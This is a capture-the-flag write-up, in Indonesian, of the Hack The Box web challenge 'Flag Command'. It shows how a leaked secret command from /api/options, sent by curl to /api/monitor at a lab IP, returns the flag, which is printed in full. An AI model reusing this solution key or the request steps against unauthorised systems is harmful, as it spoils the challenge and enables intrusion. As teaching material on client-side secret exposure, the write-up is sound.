# Hack The Box Web Challenge Writeup — Flag Command

> **Category:** Web  
> **Platform:** Hack The Box  
> **Challenge:** Flag Command  
> **Target:** `http://154.57.164.73:31003`  
> **Status:** Solved  
> **Flag:** `HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}`

---

## 1. Executive Summary

Challenge ini berbentuk game text-adventure sederhana. Saat membuka website, user diminta menjalankan command seperti `start`, lalu game menampilkan pilihan arah seperti:

```text
HEAD NORTH
HEAD SOUTH
HEAD EAST
HEAD WEST
```

Sekilas challenge terlihat seperti maze yang harus diselesaikan secara manual. Namun setelah dianalisis, pilihan-pilihan tersebut hanyalah **decoy** atau pengalih perhatian. Penyelesaian sebenarnya ada pada komunikasi antara frontend dan backend.

Dengan membuka **Developer Tools** dan melihat tab **Network**, ditemukan request menarik menuju endpoint:

```text
/api/options
```

Endpoint tersebut mengembalikan daftar semua command yang dapat digunakan dalam game, termasuk sebuah command rahasia pada key:

```json
"secret"
```

Command rahasia tersebut kemudian dikirim ke endpoint:

```text
/api/monitor
```

Setelah dikirim, server mengembalikan flag.

---

## 2. Key Takeaway

Pelajaran utama dari challenge ini:

> Jangan hanya percaya pada tampilan website. Dalam Web CTF, informasi penting sering tersembunyi di balik request API, response JSON, file JavaScript, atau Network tab.

Dalam kasus ini, vulnerability utamanya adalah:

```text
Sensitive Information Disclosure via Exposed API Endpoint
```

atau bisa juga disebut:

```text
Client-Side Game Logic Exposure
```

Artinya, aplikasi membocorkan logic atau command rahasia ke sisi client. Jika sesuatu dikirim ke browser atau dapat diakses lewat API, maka user dapat membacanya.

---

## 3. Tools yang Digunakan

| Tool | Fungsi |
|---|---|
| Browser | Membuka aplikasi web challenge |
| Developer Tools | Melihat request dan response pada tab Network |
| Network Tab | Menganalisis endpoint yang dipanggil oleh frontend |
| `curl` | Mengirim HTTP request langsung dari terminal |
| `jq` | Merapikan output JSON agar mudah dibaca |

---

## 4. Initial Access

Setelah machine challenge dijalankan, Hack The Box memberikan alamat target:

```text
http://154.57.164.73:31003
```

Saat website dibuka, tampilannya berupa terminal/game interaktif. Kita dapat mengetik command:

```text
help
```

Output-nya menunjukkan beberapa command dasar:

```text
start    Start the game
clear    Clear the game screen
audio    Toggle audio on/off
restart  Restart the game
info     Show info about the game
```

Lalu ketika menjalankan:

```text
start
```

Aplikasi menampilkan narasi:

```text
YOU WAKE UP IN A FOREST.

You have 4 options!

HEAD NORTH
HEAD SOUTH
HEAD EAST
HEAD WEST
```

Pada titik ini, game seolah meminta kita memilih arah untuk keluar dari hutan.

---

## 5. Why the Maze is a Decoy

Secara tampilan, challenge tampak seperti game maze biasa. Namun ada beberapa alasan kenapa kita tidak langsung fokus ke alur game:

1. **Ini challenge Web CTF**, jadi kemungkinan besar vulnerability ada pada request, API, JavaScript, atau client-side logic.
2. Pilihan arah seperti `HEAD NORTH`, `HEAD SOUTH`, dan lainnya terlihat seperti interaksi frontend biasa.
3. Game memberikan banyak pilihan, tetapi tidak ada petunjuk jelas bahwa semua jalur harus dicoba manual.
4. Nama challenge adalah **Flag Command**, yang mengarah pada ide bahwa flag didapatkan lewat command tertentu.

Karena itu, pendekatan terbaik adalah melakukan web reconnaissance terlebih dahulu.

---

## 6. Reconnaissance with Developer Tools

Langkah selanjutnya adalah membuka **Developer Tools** pada browser.

Pada Firefox atau Chrome:

```text
Right Click → Inspect
```

atau gunakan shortcut:

```text
F12
```

Lalu buka tab:

```text
Network
```

Setelah itu lakukan reload halaman agar semua request terlihat dari awal.

Dari tab Network, ditemukan request menarik ke endpoint:

```text
/api/options
```

Endpoint ini terlihat penting karena namanya berhubungan dengan pilihan atau command yang tersedia dalam game.

---

## 7. Inspecting the `/api/options` Endpoint

Untuk melihat isi endpoint tersebut dengan lebih jelas, digunakan `curl` dari terminal:

```bash
curl -s http://154.57.164.73:31003/api/options
```

Command ini berarti:

- `curl` digunakan untuk mengirim request HTTP dari terminal.
- `-s` berarti silent mode, agar output lebih bersih.
- URL `/api/options` adalah endpoint yang ingin kita ambil datanya.

Server mengembalikan response JSON berikut:

```json
{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```

Response ini sangat penting karena terdapat key:

```json
"secret"
```

Di dalamnya ada value:

```text
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

Ini adalah command rahasia yang tidak muncul di menu biasa.

---

## 8. Understanding the Vulnerability

Endpoint `/api/options` membocorkan seluruh command yang valid, termasuk command rahasia.

Struktur response-nya kira-kira seperti ini:

```json
{
  "allPossibleCommands": {
    "normal_commands": [
      "..."
    ],
    "secret": [
      "secret command here"
    ]
  }
}
```

Masalahnya adalah bagian `secret` tidak seharusnya dikirim ke client.

Analogi sederhananya:

> Bayangkan ada game tebak password. Server berkata: “Tebak password-nya ya. Oh iya, password rahasianya adalah `abc123`.”  
> Tentu saja player tinggal memasukkan password itu dan menang.

Itulah yang terjadi pada challenge ini. Server memberi tahu command rahasia melalui API, lalu kita tinggal mengirim command tersebut kembali ke server.

---

## 9. Exploitation

Setelah mendapatkan secret command, langkah berikutnya adalah mengirim command tersebut ke endpoint yang memproses input game.

Endpoint yang digunakan:

```text
/api/monitor
```

Payload yang dikirim:

```json
{
  "command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
}
```

Request lengkapnya:

```bash
curl -s -X POST http://154.57.164.73:31003/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}' | jq
```

Output dari server:

```json
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"
}
```

Flag berhasil didapatkan:

```text
HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
```

---

## 10. Detailed Explanation of the Exploit Command

Command exploit yang digunakan:

```bash
curl -s -X POST http://154.57.164.73:31003/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}' | jq
```

Mari dibedah satu per satu.

### `curl`

```bash
curl
```

`curl` adalah tool untuk mengirim request ke server dari terminal.

Kalau browser seperti kita datang langsung ke restoran dan melihat tampilan menu, maka `curl` seperti kita langsung mengirim pesan ke dapur:

```text
Browser = melihat website seperti user biasa
curl    = berbicara langsung dengan server/API
```

### `-s`

```bash
-s
```

`-s` berarti silent mode.

Fungsinya agar `curl` tidak menampilkan progress bar atau informasi tambahan yang tidak diperlukan.

Tanpa `-s`, output bisa lebih ramai. Dengan `-s`, yang tampil hanya response dari server.

### `-X POST`

```bash
-X POST
```

Bagian ini menentukan HTTP method yang digunakan.

Beberapa HTTP method umum:

| Method | Fungsi Sederhana |
|---|---|
| `GET` | Mengambil data |
| `POST` | Mengirim data |
| `PUT` | Mengubah data |
| `DELETE` | Menghapus data |

Dalam kasus ini digunakan `POST` karena kita ingin mengirim command ke server.

Analogi:

```text
GET  = "Saya mau lihat menu."
POST = "Saya mau mengirim pesanan."
```

Di challenge ini:

```text
POST = "Server, proses command ini."
```

### Target URL

```text
http://154.57.164.73:31003/api/monitor
```

Bagian ini adalah alamat endpoint yang menerima command.

Pecahannya:

| Bagian | Arti |
|---|---|
| `http://` | Protokol komunikasi web |
| `154.57.164.73` | IP server challenge |
| `31003` | Port aplikasi |
| `/api/monitor` | Endpoint yang memproses command |

Analogi:

```text
154.57.164.73 = alamat gedung
31003         = nomor pintu
/api/monitor  = ruangan tempat command diproses
```

### `-H "Content-Type: application/json"`

```bash
-H "Content-Type: application/json"
```

`-H` digunakan untuk menambahkan HTTP header.

Header ini memberi tahu server bahwa data yang dikirim berbentuk JSON.

JSON adalah format data yang umum digunakan API, contohnya:

```json
{
  "name": "Biel",
  "role": "CTF Player"
}
```

Pada request ini, kita memberi tahu server:

```text
Data yang saya kirim adalah JSON.
```

Jika header ini tidak diberikan, server mungkin tidak membaca payload dengan benar.

### `-d '{"command":"..."}'`

```bash
-d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

`-d` adalah data yang dikirim ke server.

Data tersebut berisi JSON:

```json
{
  "command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
}
```

Artinya kita berkata ke server:

```text
Tolong proses command ini:
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

Karena command tersebut adalah command rahasia yang valid, server mengembalikan flag.

### `| jq`

```bash
| jq
```

Tanda `|` disebut pipe.

Pipe berarti:

```text
Ambil output dari command sebelah kiri, lalu berikan ke command sebelah kanan.
```

Di sini:

```bash
curl ... | jq
```

berarti response dari server akan dirapikan oleh `jq`.

Tanpa `jq`, output mungkin terlihat seperti ini:

```json
{"message":"HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"}
```

Dengan `jq`, output menjadi lebih rapi:

```json
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"
}
```

---

## 11. Alternative Method: Submit the Secret Command in the Web UI

Selain menggunakan `curl`, secret command juga dapat dimasukkan langsung ke input game pada browser.

Langkahnya:

1. Buka website challenge.
2. Jalankan command:

```text
start
```

3. Masukkan secret command:

```text
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

4. Website akan menampilkan flag dan pesan kemenangan.

Ini membuktikan bahwa command rahasia memang diproses oleh aplikasi sebagai input valid.

---

## 12. Proof of Concept

### Request to Discover Secret Command

```bash
curl -s http://154.57.164.73:31003/api/options
```

### Secret Command Found

```text
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

### Request to Retrieve Flag

```bash
curl -s -X POST http://154.57.164.73:31003/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}' | jq
```

### Server Response

```json
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"
}
```

---

## 13. Root Cause Analysis

Root cause dari vulnerability ini adalah:

```text
Secret logic dikirim ke client melalui endpoint API.
```

Aplikasi kemungkinan memiliki logic seperti:

```text
Frontend meminta semua command ke backend.
Backend mengirim command biasa dan command rahasia.
Frontend menggunakan daftar command tersebut untuk menjalankan game.
```

Masalahnya, semua data yang dikirim ke frontend bisa dilihat oleh user.

Walaupun command rahasia tidak ditampilkan langsung di UI, command tersebut tetap ada di response API. Karena itu, user dapat menemukannya melalui:

- Browser Developer Tools
- Network tab
- `curl`
- Proxy tools seperti Burp Suite
- JavaScript analysis

Ini adalah contoh klasik dari:

```text
Security through obscurity
```

Aplikasi mencoba menyembunyikan sesuatu dari tampilan UI, tetapi tetap mengirimkannya ke client.

---

## 14. Security Impact

Pada konteks CTF, dampaknya adalah player bisa mendapatkan flag tanpa menyelesaikan maze secara normal.

Pada aplikasi nyata, bug seperti ini bisa berdampak lebih serius, misalnya:

- Endpoint membocorkan admin-only action.
- API mengirim role atau permission yang seharusnya rahasia.
- Frontend menerima token, secret key, atau internal configuration.
- User biasa bisa menemukan fitur tersembunyi yang belum boleh diakses.
- Business logic dapat dibypass karena validasi terlalu bergantung pada client-side.

Contoh kasus nyata:

```text
Sebuah aplikasi e-commerce menyembunyikan kupon khusus admin dari UI,
tetapi endpoint API tetap mengirim kupon tersebut ke browser.
User tinggal membuka Network tab dan memakai kupon itu.
```

---

## 15. Recommended Fixes

Agar vulnerability seperti ini tidak terjadi, beberapa perbaikan yang sebaiknya dilakukan adalah:

### 1. Jangan Kirim Secret ke Client

Secret command tidak boleh ada dalam response `/api/options`.

Response seharusnya hanya berisi command yang memang boleh dilihat oleh user.

Contoh response yang lebih aman:

```json
{
  "availableCommands": [
    "HEAD NORTH",
    "HEAD WEST",
    "HEAD EAST",
    "HEAD SOUTH"
  ]
}
```

### 2. Validasi Logic di Server

Server harus menyimpan dan memvalidasi command rahasia secara internal.

Frontend cukup mengirim input user, lalu backend menentukan apakah input tersebut valid atau tidak.

### 3. Terapkan Principle of Least Privilege

Client hanya boleh menerima data yang dibutuhkan untuk tampilan dan interaksi normal.

Jika data tidak perlu diketahui user, jangan kirim data tersebut ke browser.

### 4. Jangan Mengandalkan Hidden UI

Menyembunyikan button, command, atau field di frontend bukan mekanisme keamanan.

Semua yang berada di client-side dapat diperiksa oleh user.

### 5. Review API Response

Developer harus memeriksa kembali response API untuk memastikan tidak ada data sensitif seperti:

- Secret
- Token
- API key
- Hidden admin command
- Internal configuration
- Debug information
- Unreleased feature flag

---

## 16. Final Attack Flow

Alur penyelesaian challenge secara ringkas:

```text
1. Buka target web challenge.
2. Jalankan command help dan start.
3. Lihat bahwa game memberikan pilihan maze.
4. Curigai bahwa maze hanyalah decoy.
5. Buka Developer Tools.
6. Masuk ke tab Network.
7. Reload halaman dan amati request.
8. Temukan endpoint /api/options.
9. Ambil isi endpoint menggunakan curl.
10. Temukan key "secret".
11. Ambil secret command.
12. Kirim secret command ke /api/monitor menggunakan POST request.
13. Server mengembalikan flag.
```

---

## 17. Commands Recap

```bash
curl -s http://154.57.164.73:31003/api/options
```

```bash
curl -s -X POST http://154.57.164.73:31003/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}' | jq
```

---

## 18. Conclusion

Challenge **Flag Command** mengajarkan konsep penting dalam Web Security: **data yang dikirim ke client tidak bisa dianggap rahasia**.

Walaupun command rahasia tidak muncul langsung pada tampilan game, command tersebut tetap dapat ditemukan melalui endpoint `/api/options`. Setelah command rahasia ditemukan, kita hanya perlu mengirimkannya ke `/api/monitor` untuk mendapatkan flag.

Dari sisi CTF, ini adalah challenge yang bagus untuk melatih kebiasaan:

- Membuka Developer Tools.
- Memeriksa Network tab.
- Membaca response API.
- Menggunakan `curl` untuk berinteraksi langsung dengan endpoint.
- Memahami perbedaan antara UI dan backend logic.

Dari sisi security, bug ini menunjukkan bahwa validasi penting harus dilakukan di server, dan data sensitif tidak boleh dikirim ke client.

---

## 19. Ethical Note

Writeup ini dibuat untuk pembelajaran cybersecurity pada lingkungan legal dan terkontrol, yaitu Hack The Box CTF lab.

Teknik yang dijelaskan di sini hanya boleh digunakan pada:

- Lab CTF
- Sistem milik sendiri
- Target yang memiliki izin eksplisit
- Program bug bounty dengan scope yang jelas

Jangan menggunakan teknik serupa pada sistem publik tanpa izin.
